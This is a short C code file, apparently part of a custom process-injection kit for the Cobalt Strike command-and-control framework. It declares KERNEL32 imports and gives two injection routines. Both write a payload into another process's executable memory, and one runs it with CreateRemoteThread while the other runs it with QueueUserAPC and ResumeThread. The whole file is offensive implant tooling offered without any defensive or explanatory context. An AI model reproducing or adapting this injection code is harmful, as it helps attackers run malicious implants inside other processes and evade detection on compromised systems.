// ./build.sh /mnt/c/Tools/cobaltstrike/custom-injection
// IMPORT
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
WINBASEAPI BOOL WINAPI KERNEL32$WriteProcessMemory(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateRemoteThread(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
WINBASEAPI DWORD WINAPI KERNEL32$QueueUserAPC(PAPCFUNC, HANDLE, ULONG, ULONG_PTR);
WINBASEAPI DWORD WINAPI KERNEL32$ResumeThread(HANDLE);

﻿
// CREATE REMOTE THREAD
LPVOID hMemory = KERNEL32$VirtualAllocEx(pi.hProcess, NULL, dllLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
SIZE_T written;
BOOL success = KERNEL32$WriteProcessMemory (pi.hProcess, hMemory, dllPtr, dllLen, &written);
DWORD threadId;
HANDLE hThread = KERNEL32$CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)hMemory, NULL, 0, &threadId); 
KERNEL32$CloseHandle(hThread);
BeaconCleanupProcess(&pi);

// QueuUserAPC
LPVOID hMemory = KERNEL32$VirtualAllocEx(pi.hProcess, NULL, dllLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
SIZE_T written;
BOOL success = KERNEL32$WriteProcessMemory (pi.hProcess, hMemory, dllPtr, dllLen, &written);
DWORD please = KERNEL32$QueueUserAPC((PAPCFUNC)hMemory,pi.hThread,0,0);
KERNEL32$ResumeThread(pi.hThread);
KERNEL32$CloseHandle(pi.hThread);
BeaconCleanupProcess(&pi);
